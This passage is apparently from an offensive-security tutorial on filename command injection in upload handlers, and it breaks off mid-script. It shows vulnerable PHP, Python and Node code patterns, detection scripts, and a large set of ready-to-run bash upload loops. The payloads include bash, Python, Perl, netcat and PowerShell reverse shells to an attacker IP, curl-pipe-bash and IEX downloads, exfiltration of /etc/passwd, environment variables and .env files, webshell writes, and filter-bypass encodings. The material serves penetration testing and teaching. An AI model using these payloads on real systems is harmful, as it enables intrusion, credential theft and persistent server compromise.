---
title: Filename Command Injection
description: Filename Command Injection — Exploit Unsafe Filename Handling for OS Command Execution
navigation:
  icon: i-lucide-terminal-square
  title: Filename Command Injection
---

## Filename Command Injection


When a web application processes an uploaded file, the filename often travels through multiple server-side operations — renaming, moving, converting, thumbnailing, logging, virus scanning, metadata extraction, and database insertion. If **any** of these operations passes the filename to a shell command without proper sanitization, the attacker controls what the operating system executes. The filename `; curl attacker.com/shell.sh | bash ;.jpg` doesn't need to contain a webshell. The filename **IS** the weapon.

::tip
Filename command injection is fundamentally different from uploading a webshell. You are not trying to upload executable code — you are injecting OS commands **into the filename string itself**, which the server then passes to a shell. The actual file content can be a legitimate image. The attack surface is the name, not the content.
::

This vulnerability occurs because developers treat filenames as simple data strings, forgetting that when a filename is concatenated into a shell command, every shell metacharacter (`; | & $ \` ( ) { } < > \n`) becomes a command separator or operator. The gap between "I'm handling a filename" and "I'm building a shell command" is where exploitation lives.

---

## Understanding the Attack Surface

### Where Filenames Become Commands

Applications process filenames through many operations. Each one is a potential injection point.

::accordion
  :::accordion-item{icon="i-lucide-cog" label="Image Processing Pipelines"}
  The most common injection vector. Applications use ImageMagick (`convert`), GraphicsMagick (`gm`), FFmpeg, ExifTool, or other CLI tools to process uploaded images.

  **Vulnerable code pattern:**
  ```php
  $filename = $_FILES['file']['name'];
  // Resize image — filename goes directly into shell command
  exec("convert /tmp/" . $filename . " -resize 200x200 /uploads/thumb_" . $filename);
  ```

  If `$filename` is `test.jpg; curl attacker.com/shell.sh | bash;.jpg`, the server executes:
  ```bash
  convert /tmp/test.jpg; curl attacker.com/shell.sh | bash;.jpg -resize 200x200 /uploads/thumb_test.jpg; curl attacker.com/shell.sh | bash;.jpg
  ```

  The semicolons break the command into three parts — `convert` (which may fail), `curl ... | bash` (which downloads and executes a shell script), and the remainder (which fails but doesn't matter).
  :::

  :::accordion-item{icon="i-lucide-cog" label="File System Operations"}
  Moving, copying, renaming, or deleting files via shell commands instead of native language functions.

  **Vulnerable patterns:**
  ```python
  # Python — using os.system instead of shutil.move
  os.system(f"mv /tmp/{filename} /uploads/{filename}")

  # PHP — using exec instead of rename()
  exec("mv /tmp/" . $filename . " /uploads/" . $filename);

  # Node.js — using child_process instead of fs.rename
  exec(`mv /tmp/${filename} /uploads/${filename}`);
  ```
  :::

  :::accordion-item{icon="i-lucide-cog" label="Antivirus / Malware Scanning"}
  Applications that scan uploads with ClamAV, VirusTotal CLI, or custom scanners via shell.

  ```php
  exec("clamscan /tmp/" . $filename);
  exec("yara /rules/malware.yar /tmp/" . $filename);
  ```
  :::

  :::accordion-item{icon="i-lucide-cog" label="Document Conversion"}
  Converting documents between formats using LibreOffice, Pandoc, wkhtmltopdf, or similar tools.

  ```python
  os.system(f"libreoffice --convert-to pdf /uploads/{filename}")
  os.system(f"wkhtmltopdf /uploads/{filename} /output/{filename}.pdf")
  ```
  :::

  :::accordion-item{icon="i-lucide-cog" label="Archive Handling"}
  Extracting uploaded archives with `unzip`, `tar`, `7z`, etc.

  ```bash
  exec("unzip /tmp/" . $filename . " -d /uploads/extracted/");
  exec("tar xzf /tmp/" . $filename . " -C /uploads/extracted/");
  ```
  :::

  :::accordion-item{icon="i-lucide-cog" label="Metadata Extraction"}
  Reading metadata from files using `exiftool`, `ffprobe`, `mediainfo`, `identify`, etc.

  ```php
  $metadata = shell_exec("exiftool /uploads/" . $filename);
  $info = shell_exec("ffprobe -v quiet -print_format json /uploads/" . $filename);
  $identify = shell_exec("identify -verbose /uploads/" . $filename);
  ```
  :::

  :::accordion-item{icon="i-lucide-cog" label="Logging & Database Insertion"}
  Filenames written to log files or inserted into database queries that are later processed.

  ```php
  // Log injection — if log viewer renders HTML, this becomes XSS
  error_log("Uploaded file: " . $filename);

  // If filename goes into SQL without parameterization
  $db->query("INSERT INTO uploads (name) VALUES ('" . $filename . "')");
  ```
  :::
::

### Shell Metacharacters Reference

Every shell (bash, sh, zsh, cmd.exe, PowerShell) has metacharacters that break or chain commands. Understanding these is essential for crafting filenames.

::collapsible

| Character | Bash/sh Effect | Example in Filename |
| --------- | -------------- | ------------------- |
| `;` | Command separator | `file;id;.jpg` → runs `id` |
| `|` | Pipe output | `file|id.jpg` → pipes to `id` |
| `&` | Background execution | `file&id&.jpg` → runs `id` in background |
| `&&` | AND (run if previous succeeds) | `file&&id.jpg` |
| `||` | OR (run if previous fails) | `file||id.jpg` |
| `` ` `` | Command substitution (backtick) | `` file`id`.jpg `` → executes `id` |
| `$()` | Command substitution (modern) | `file$(id).jpg` → executes `id` |
| `${}` | Variable expansion | `file${IFS}id.jpg` |
| `>` | Redirect stdout to file | `file>output.txt.jpg` |
| `<` | Redirect file to stdin | `file<input.txt.jpg` |
| `>>` | Append stdout to file | `file>>log.txt.jpg` |
| `\n` (`%0a`) | Newline (command separator) | `file%0aid%0a.jpg` |
| `\r` (`%0d`) | Carriage return | `file%0did%0d.jpg` |
| `'` | Single quote (string delimiter) | `file'.jpg` → break out of quotes |
| `"` | Double quote (string delimiter) | `file".jpg` → break out of quotes |
| `\` | Escape character | `file\.jpg` |
| `#` | Comment (ignores rest of line) | `file#.jpg` → filename becomes `file` |
| `!` | History expansion (bash) | `file!.jpg` |
| `~` | Home directory expansion | `~/evil.jpg` |
| `*` | Glob wildcard | `*.jpg` |
| `?` | Single char wildcard | `?.jpg` |
| `[` `]` | Character class | `[a-z].jpg` |
| `(` `)` | Subshell | `(id).jpg` |
| `{` `}` | Brace expansion | `{id,whoami}.jpg` |
| `$IFS` | Internal Field Separator (space) | `${IFS}id` → acts as space |

::

---

## Reconnaissance — Detecting Injection Points

### Identify Filename Processing

::tabs
  :::tabs-item{icon="i-lucide-search" label="Behavioral Detection via Special Characters"}
  ```bash
  # ═══════════════════════════════════════════════
  # Upload files with special characters in the name
  # and observe server behavior differences
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Create a minimal valid image for each test
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/test_img.jpg

  echo "═══ Filename Special Character Behavior Test ═══"
  echo "[*] Comparing response behavior for different filename characters"
  echo ""

  # Baseline: normal filename
  BASELINE_STATUS=$(curl -s -o /tmp/baseline_resp.txt -w "%{http_code}" \
    -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test_img.jpg;filename=normal_photo.jpg" \
    -H "Cookie: $COOKIE")
  BASELINE_SIZE=$(wc -c < /tmp/baseline_resp.txt)
  BASELINE_TIME=$(curl -s -o /dev/null -w "%{time_total}" \
    -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test_img.jpg;filename=normal_photo.jpg" \
    -H "Cookie: $COOKIE")

  echo "[*] Baseline: status=${BASELINE_STATUS} size=${BASELINE_SIZE} time=${BASELINE_TIME}s"
  echo ""

  # Test each special character in filename
  for test_name in \
      "semicolon|test;.jpg" \
      "pipe|test|.jpg" \
      "ampersand|test&.jpg" \
      "backtick|test\`.jpg" \
      "dollar_paren|test\$(id).jpg" \
      "dollar_brace|test\${IFS}.jpg" \
      "newline|test%0a.jpg" \
      "crlf|test%0d%0a.jpg" \
      "single_quote|test'.jpg" \
      "double_quote|test\".jpg" \
      "backslash|test\\.jpg" \
      "hash|test#.jpg" \
      "redirect_out|test>.jpg" \
      "redirect_in|test<.jpg" \
      "paren_open|test(.jpg" \
      "paren_close|test).jpg" \
      "brace_open|test{.jpg" \
      "space_cmd|test id.jpg" \
      "tab|test%09.jpg"; do

      CHAR_NAME=$(echo "$test_name" | cut -d'|' -f1)
      FILENAME=$(echo "$test_name" | cut -d'|' -f2)

      STATUS=$(curl -s -o /tmp/test_resp.txt -w "%{http_code}" \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/test_img.jpg;filename=${FILENAME}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      RESP_SIZE=$(wc -c < /tmp/test_resp.txt 2>/dev/null)
      RESP_BODY=$(cat /tmp/test_resp.txt 2>/dev/null)

      # Analyze differences from baseline
      INDICATOR=" "
      DETAIL=""

      if [ "$STATUS" != "$BASELINE_STATUS" ]; then
          INDICATOR="!"
          DETAIL="status differs (${STATUS} vs ${BASELINE_STATUS})"
      fi

      if [ "$STATUS" = "500" ]; then
          INDICATOR="★"
          DETAIL="SERVER ERROR — possible command injection!"
      fi

      SIZE_DIFF=$((RESP_SIZE - BASELINE_SIZE))
      if [ "${SIZE_DIFF#-}" -gt 100 ]; then
          INDICATOR="~"
          DETAIL="${DETAIL} size differs by ${SIZE_DIFF}"
      fi

      # Check for error messages revealing shell interaction
      if echo "$RESP_BODY" | grep -qiE "sh:|bash:|command not found|syntax error|unexpected|no such file|permission denied|cannot execute|not found"; then
          INDICATOR="★"
          DETAIL="${DETAIL} SHELL ERROR IN RESPONSE!"
      fi

      printf "  [%s] %-15s %-25s [%s] %s\n" "$INDICATOR" "$CHAR_NAME" "$FILENAME" "$STATUS" "$DETAIL"
  done

  echo ""
  echo "[*] Legend:"
  echo "    [★] = Likely command injection (shell error or 500)"
  echo "    [!] = Status code change (possible injection)"
  echo "    [~] = Response size change (possible different behavior)"
  echo "    [ ] = Normal behavior"

  rm -f /tmp/test_img.jpg /tmp/baseline_resp.txt /tmp/test_resp.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Time-Based Injection Detection"}
  ```bash
  # ═══════════════════════════════════════════════
  # Detect command injection via response time differences
  # If the filename causes a sleep command to execute,
  # the response will be delayed
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/time_img.jpg

  echo "═══ Time-Based Command Injection Detection ═══"

  # Baseline timing
  BASELINE=$(curl -s -o /dev/null -w "%{time_total}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/time_img.jpg;filename=normal.jpg" \
    -H "Cookie: $COOKIE")
  echo "[*] Baseline response time: ${BASELINE}s"
  echo ""

  # Test sleep-based payloads in filename
  SLEEP_FILENAMES=(
      '; sleep 5 ;.jpg'
      '| sleep 5 |.jpg'
      '& sleep 5 &.jpg'
      '`sleep 5`.jpg'
      '$(sleep 5).jpg'
      '; sleep 5 #.jpg'
      '|| sleep 5 ||.jpg'
      '&& sleep 5 &&.jpg'
      "%0asleep 5%0a.jpg"
      "%0d%0asleep 5%0d%0a.jpg"
      "'; sleep 5 ;'.jpg"
      '"; sleep 5 ;".jpg'
      '; ping -c 5 127.0.0.1 ;.jpg'
      '$(ping -c 5 127.0.0.1).jpg'
      '| timeout 5 cat /dev/zero |.jpg'
  )

  for payload in "${SLEEP_FILENAMES[@]}"; do
      START=$(date +%s%N)
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/time_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      END=$(date +%s%N)
      ELAPSED=$(( (END - START) / 1000000 ))
      ELAPSED_SEC=$(echo "scale=1; $ELAPSED / 1000" | bc 2>/dev/null || echo "$((ELAPSED/1000))")

      # If response takes >4 seconds more than baseline → sleep executed
      INDICATOR=" "
      if [ "$ELAPSED" -gt 4000 ]; then
          INDICATOR="★"
      fi

      printf "  [%s] %6sms [%s] %s\n" "$INDICATOR" "$ELAPSED" "$STATUS" "$payload"
  done

  echo ""
  echo "[★] = Response delayed >4s — COMMAND INJECTION LIKELY"

  rm -f /tmp/time_img.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="OOB (Out-of-Band) Detection"}
  ```bash
  # ═══════════════════════════════════════════════
  # Detect injection via DNS/HTTP callbacks
  # The injected command triggers a callback to attacker's server
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  COLLAB="YOUR_COLLAB_ID.oastify.com"  # Burp Collaborator or interactsh

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/oob_img.jpg

  echo "═══ OOB Command Injection Detection ═══"
  echo "[*] Collaborator: ${COLLAB}"
  echo ""

  # DNS-based callbacks (most reliable — works through firewalls)
  DNS_PAYLOADS=(
      "; nslookup fn-semicolon.${COLLAB} ;.jpg"
      '| nslookup fn-pipe.'${COLLAB}' |.jpg'
      '`nslookup fn-backtick.'${COLLAB}'`.jpg'
      '$(nslookup fn-dollar.'${COLLAB}').jpg'
      "; dig fn-dig.${COLLAB} ;.jpg"
      "; host fn-host.${COLLAB} ;.jpg"
      "; ping -c 1 fn-ping.${COLLAB} ;.jpg"
      "%0anslookup fn-newline.${COLLAB}%0a.jpg"
  )

  for payload in "${DNS_PAYLOADS[@]}"; do
      SAFE_NAME=$(echo "$payload" | head -c 40)
      curl -s -o /dev/null -w "[%{http_code}] " -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/oob_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null
      echo "${SAFE_NAME}..."
  done

  echo ""

  # HTTP-based callbacks
  HTTP_PAYLOADS=(
      "; curl http://${COLLAB}/fn-curl ;.jpg"
      "; wget http://${COLLAB}/fn-wget ;.jpg"
      '$(curl http://'${COLLAB}'/fn-dollar-curl).jpg'
      '`curl http://'${COLLAB}'/fn-backtick-curl`.jpg'
      "| curl http://${COLLAB}/fn-pipe-curl |.jpg"
      "; curl http://${COLLAB}/fn-\$(whoami) ;.jpg"
  )

  for payload in "${HTTP_PAYLOADS[@]}"; do
      SAFE_NAME=$(echo "$payload" | head -c 40)
      curl -s -o /dev/null -w "[%{http_code}] " -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/oob_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null
      echo "${SAFE_NAME}..."
  done

  echo ""
  echo "[*] Check Burp Collaborator / interactsh for callbacks matching 'fn-*'"
  echo "[*] The prefix (fn-semicolon, fn-pipe, etc.) tells you WHICH separator worked"

  rm -f /tmp/oob_img.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Source Code Patterns (Gray-Box)"}
  ```bash
  # ═══════════════════════════════════════════════
  # Search source code for unsafe filename handling
  # ═══════════════════════════════════════════════

  echo "═══ Source Code — Filename Command Injection Patterns ═══"

  # PHP — shell functions with filename
  echo "─── PHP ───"
  grep -rnE "(exec|system|passthru|shell_exec|popen|proc_open)\s*\(" --include="*.php" . 2>/dev/null | \
    grep -iE "file|name|upload|path|image|doc|pdf|media" | head -20
  grep -rnE "escapeshellarg|escapeshellcmd" --include="*.php" . 2>/dev/null | head -10
  echo ""

  # Python — os.system, subprocess with filename
  echo "─── Python ───"
  grep -rnE "(os\.system|os\.popen|subprocess\.(call|run|Popen|check_output))" --include="*.py" . 2>/dev/null | \
    grep -iE "file|name|upload|path|image|doc|pdf|media" | head -20
  grep -rnE "shell\s*=\s*True" --include="*.py" . 2>/dev/null | head -10
  echo ""

  # Node.js — child_process with filename
  echo "─── Node.js ───"
  grep -rnE "(exec|execSync|spawn|execFile|fork)\s*\(" --include="*.js" --include="*.ts" . 2>/dev/null | \
    grep -iE "file|name|upload|path|image|doc|pdf|media" | head -20
  echo ""

  # Ruby — system, backtick, %x with filename
  echo "─── Ruby ───"
  grep -rnE "(system|exec|\`|%x\[|%x\(|Open3)" --include="*.rb" . 2>/dev/null | \
    grep -iE "file|name|upload|path|image|doc|pdf|media" | head -20
  echo ""

  # Java — Runtime.exec, ProcessBuilder
  echo "─── Java ───"
  grep -rnE "(Runtime\.getRuntime\(\)\.exec|ProcessBuilder|Process)" --include="*.java" . 2>/dev/null | \
    grep -iE "file|name|upload|path|image|doc|pdf|media" | head -20
  echo ""

  # Generic — common CLI tools invoked with filenames
  echo "─── CLI Tool Invocations ───"
  grep -rnE "(convert|identify|exiftool|ffmpeg|ffprobe|wkhtmltopdf|libreoffice|clamscan|unzip|tar|gm |mogrify)" \
    --include="*.php" --include="*.py" --include="*.js" --include="*.rb" --include="*.java" --include="*.sh" . 2>/dev/null | head -30
  ```
  :::
::

---

## Payload Crafting

### Linux Command Injection Filenames

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic Separator Payloads"}
  ```bash
  # ═══════════════════════════════════════════════
  # Each line is a filename to upload
  # These use different command separators
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Create valid image for all uploads
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/payload_img.jpg

  echo "═══ Command Separator Payloads ═══"

  # Semicolon — most common separator
  PAYLOADS_SEMI=(
      '; id ;.jpg'
      '; id #.jpg'
      '; whoami ;.jpg'
      '; cat /etc/passwd ;.jpg'
      '; uname -a ;.jpg'
      ';id;.jpg'
  )

  # Pipe — chains commands
  PAYLOADS_PIPE=(
      '| id |.jpg'
      '| id.jpg'
      '|id.jpg'
      '| whoami.jpg'
      '| cat /etc/passwd.jpg'
  )

  # Ampersand — background execution
  PAYLOADS_AMP=(
      '& id &.jpg'
      '&id&.jpg'
      '&& id &&.jpg'
      '|| id ||.jpg'
      '&& id.jpg'
  )

  # Command substitution — backticks
  PAYLOADS_BACKTICK=(
      '`id`.jpg'
      '`whoami`.jpg'
      '`cat /etc/passwd`.jpg'
      '`sleep 5`.jpg'
  )

  # Command substitution — $()
  PAYLOADS_DOLLAR=(
      '$(id).jpg'
      '$(whoami).jpg'
      '$(cat /etc/passwd).jpg'
      '$(sleep 5).jpg'
      '$(curl http://ATTACKER/rce).jpg'
  )

  # Newline injection
  PAYLOADS_NEWLINE=(
      '%0aid%0a.jpg'
      '%0awhoami%0a.jpg'
      '%0d%0aid%0d%0a.jpg'
      $'test\nid\n.jpg'
  )

  # Test all payload categories
  for category_name in SEMI PIPE AMP BACKTICK DOLLAR NEWLINE; do
      eval "PAYLOADS=(\"\${PAYLOADS_${category_name}[@]}\")"
      echo ""
      echo "─── ${category_name} ───"
      for payload in "${PAYLOADS[@]}"; do
          STATUS=$(curl -s -o /tmp/fn_resp.txt -w "%{http_code}" --max-time 15 \
            -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/payload_img.jpg;filename=${payload}" \
            -H "Cookie: $COOKIE" 2>/dev/null)

          RESP=$(cat /tmp/fn_resp.txt 2>/dev/null)
          INDICATOR=" "

          # Check for command output in response
          if echo "$RESP" | grep -qE "uid=|root:|www-data|Linux|Darwin"; then
              INDICATOR="★"
          elif [ "$STATUS" = "500" ]; then
              INDICATOR="!"
          fi

          printf "  [%s] [%s] %s\n" "$INDICATOR" "$STATUS" "$payload"

          [ "$INDICATOR" = "★" ] && echo "      OUTPUT: $(echo "$RESP" | grep -oE 'uid=[^ ]+' | head -1)"
      done
  done

  rm -f /tmp/payload_img.jpg /tmp/fn_resp.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shell via Filename"}
  ```bash
  # ═══════════════════════════════════════════════
  # Filename payloads that establish reverse shells
  # Replace ATTACKER_IP and PORT with your values
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  ATTACKER_IP="10.10.14.1"
  PORT="4444"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/rev_img.jpg

  # Start listener on attacker machine first:
  # nc -lvnp 4444

  echo "═══ Reverse Shell Filenames ═══"
  echo "[*] Start listener: nc -lvnp ${PORT}"
  echo ""

  REV_PAYLOADS=(
      # Bash reverse shell
      "; bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${PORT} 0>&1' ;.jpg"
      "\`bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${PORT} 0>&1'\`.jpg"

      # Bash via base64 (avoids special char issues)
      "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ== | base64 -d | bash ;.jpg"

      # Python reverse shell
      "; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${ATTACKER_IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' ;.jpg"

      # Perl reverse shell
      "; perl -e 'use Socket;\$i=\"${ATTACKER_IP}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")' ;.jpg"

      # Netcat reverse shell
      "; nc ${ATTACKER_IP} ${PORT} -e /bin/bash ;.jpg"
      "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ATTACKER_IP} ${PORT} >/tmp/f ;.jpg"

      # curl + execute
      "; curl http://${ATTACKER_IP}:8080/shell.sh | bash ;.jpg"
      "; wget -qO- http://${ATTACKER_IP}:8080/shell.sh | bash ;.jpg"
  )

  for payload in "${REV_PAYLOADS[@]}"; do
      DISPLAY=$(echo "$payload" | head -c 70)
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
        -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/rev_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] ${DISPLAY}..."
  done

  rm -f /tmp/rev_img.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Data Exfiltration via Filename"}
  ```bash
  # ═══════════════════════════════════════════════
  # Extract sensitive data through the filename injection
  # Data sent via DNS, HTTP, or written to accessible files
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  COLLAB="YOUR_COLLAB_ID.oastify.com"
  ATTACKER="10.10.14.1"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/exfil_img.jpg

  echo "═══ Data Exfiltration Filenames ═══"

  EXFIL_PAYLOADS=(
      # DNS exfil — whoami
      "; nslookup \$(whoami).${COLLAB} ;.jpg"
      '; nslookup `whoami`.'"${COLLAB}"' ;.jpg'

      # DNS exfil — hostname
      "; host \$(hostname).${COLLAB} ;.jpg"

      # DNS exfil — base64 encoded data
      "; nslookup \$(cat /etc/hostname | base64 | tr -d '=+/\n' | head -c 60).${COLLAB} ;.jpg"

      # HTTP exfil — /etc/passwd
      "; curl http://${ATTACKER}:8080/exfil?data=\$(cat /etc/passwd | base64 -w0) ;.jpg"

      # HTTP exfil — environment variables
      "; curl http://${ATTACKER}:8080/exfil -d \"\$(env)\" ;.jpg"

      # HTTP exfil — web.config / .env
      "; curl http://${ATTACKER}:8080/exfil -d @/var/www/html/.env ;.jpg"

      # Write data to accessible file
      "; cat /etc/passwd > /var/www/html/uploads/passwd.txt ;.jpg"
      "; env > /var/www/html/uploads/env.txt ;.jpg"

      # Write webshell (persistence)
      "; echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/uploads/cmd.php ;.jpg"
  )

  for payload in "${EXFIL_PAYLOADS[@]}"; do
      DISPLAY=$(echo "$payload" | head -c 60)
      curl -s -o /dev/null -w "[%{http_code}] " -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/exfil_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null
      echo "${DISPLAY}..."
  done

  rm -f /tmp/exfil_img.jpg
  ```
  :::
::

### Windows Command Injection Filenames

::code-group
```bash [Windows cmd.exe Payloads]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
ATTACKER="10.10.14.1"

printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/win_img.jpg

echo "═══ Windows Filename Injection Payloads ═══"

WIN_PAYLOADS=(
    # cmd.exe separators
    '& whoami &.jpg'
    '| whoami |.jpg'
    '&& whoami &&.jpg'
    '|| whoami ||.jpg'
    '& net user &.jpg'
    '& ipconfig &.jpg'
    '& systeminfo &.jpg'

    # PowerShell execution
    '& powershell -c "whoami" &.jpg'
    '& powershell IEX(New-Object Net.WebClient).DownloadString("http://'${ATTACKER}':8080/shell.ps1") &.jpg'

    # Write webshell (IIS/ASPX)
    '& echo ^<%eval request("cmd")%^> > C:\inetpub\wwwroot\uploads\cmd.asp &.jpg'

    # Certutil download
    '& certutil -urlcache -split -f http://'${ATTACKER}':8080/nc.exe C:\Windows\Temp\nc.exe &.jpg'

    # Reverse shell
    '& C:\Windows\Temp\nc.exe '${ATTACKER}' 4444 -e cmd.exe &.jpg'

    # Ping for time-based detection (Windows)
    '& ping -n 5 127.0.0.1 &.jpg'
    '| ping -n 5 127.0.0.1.jpg'

    # DNS exfil (Windows)
    '& nslookup %USERNAME%.YOUR_COLLAB_ID.oastify.com &.jpg'
)

for payload in "${WIN_PAYLOADS[@]}"; do
    DISPLAY=$(echo "$payload" | head -c 60)
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
      -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/win_img.jpg;filename=${payload}" \
      -H "Cookie: $COOKIE" 2>/dev/null)
    echo "[${STATUS}] ${DISPLAY}..."
done

rm -f /tmp/win_img.jpg
```

```bash [PowerShell Filenames]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"

printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/ps_img.jpg

PS_PAYLOADS=(
    # Direct execution
    '& powershell -NoP -W Hidden -c "whoami" &.jpg'

    # Encoded command (bypasses char restrictions)
    '& powershell -enc dwBoAG8AYQBtAGkA &.jpg'
    # Above is base64 of "whoami"

    # Download and execute
    '& powershell -c "IEX(iwr http://ATTACKER/shell.ps1)" &.jpg'

    # Reverse shell
    '& powershell -c "$c=New-Object Net.Sockets.TCPClient(\"ATTACKER\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=[text.encoding]::ASCII.GetBytes($r+\"PS> \");$s.Write($t,0,$t.Length);$s.Flush()};$c.Close()" &.jpg'
)

for payload in "${PS_PAYLOADS[@]}"; do
    DISPLAY=$(echo "$payload" | head -c 60)
    curl -s -o /dev/null -w "[%{http_code}] " -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/ps_img.jpg;filename=${payload}" \
      -H "Cookie: $COOKIE" 2>/dev/null
    echo "${DISPLAY}..."
done

rm -f /tmp/ps_img.jpg
```
::

### Filter Bypass & Evasion Payloads

When basic payloads are blocked, use encoding, alternative separators, and evasion techniques.

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Character Filtering Bypass"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/bypass_img.jpg

  echo "═══ Filter Bypass Filenames ═══"

  BYPASS_PAYLOADS=(
      # Space bypass using $IFS (Internal Field Separator)
      ';cat${IFS}/etc/passwd;.jpg'
      ';cat$IFS/etc/passwd;.jpg'
      '$(cat${IFS}/etc/passwd).jpg'

      # Space bypass using tab (%09)
      ';cat%09/etc/passwd;.jpg'

      # Space bypass using {,} brace expansion
      ';{cat,/etc/passwd};.jpg'

      # Space bypass using < redirect
      ';cat</etc/passwd;.jpg'

      # Bypass keyword filters with variable insertion
      ';c""at /etc/passwd;.jpg'
      ";c''at /etc/passwd;.jpg"
      ';c\at /etc/passwd;.jpg'

      # Bypass using wildcards
      ';cat /etc/pass?d;.jpg'
      ';cat /etc/p*d;.jpg'
      ';/???/??t /???/??ss??;.jpg'

      # Bypass using hex/octal
      ';$(printf "\x69\x64");.jpg'    # "id" in hex
      ';$(printf "\151\144");.jpg'     # "id" in octal

      # Bypass using base64
      ';$(echo aWQ= | base64 -d);.jpg'  # "id"
      ';echo aWQ= | base64 -d | bash;.jpg'

      # Bypass using $() nesting
      ';$($(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d));.jpg'

      # Bypass using variable assignment
      ';a=i;b=d;$a$b;.jpg'
      ';a=ca;b=t;c=/etc/passwd;$a$b$IFS$c;.jpg'

      # Newline bypass (URL-encoded)
      'test%0a%0did%0a%0d.jpg'
      'test%0aid.jpg'

      # Unicode newline variants
      'test%E2%80%A8id.jpg'    # Line separator
      'test%E2%80%A9id.jpg'    # Paragraph separator

      # Tab as separator
      "test%09id.jpg"
  )

  for payload in "${BYPASS_PAYLOADS[@]}"; do
      STATUS=$(curl -s -o /tmp/bp_resp.txt -w "%{http_code}" --max-time 10 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/bypass_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      RESP=$(cat /tmp/bp_resp.txt 2>/dev/null)
      INDICATOR=" "

      if echo "$RESP" | grep -qE "uid=|root:|www-data|Linux"; then
